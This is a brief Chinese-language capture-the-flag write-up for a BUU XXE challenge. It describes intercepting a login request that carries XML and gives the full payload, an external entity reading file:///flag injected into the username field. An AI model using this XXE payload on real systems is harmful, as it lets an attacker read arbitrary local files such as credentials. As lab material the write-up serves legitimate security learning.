# BUU XXE COURSE 1

`考点：XXE`

- 进入发现是一个登录，随便输入，点击go并进行抓包，发现xml文档

> <img src="../../IMG2/Screenshot 2024-05-12 191929.png">

- 构建payload，得到flag

```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
<!ENTITY admin SYSTEM "file:///flag">
]>
<root>
    <username>&admin;</username>
    <password>1</password>
</root>
```

> <img src="../../IMG2/Screenshot 2024-05-12 192339.png">

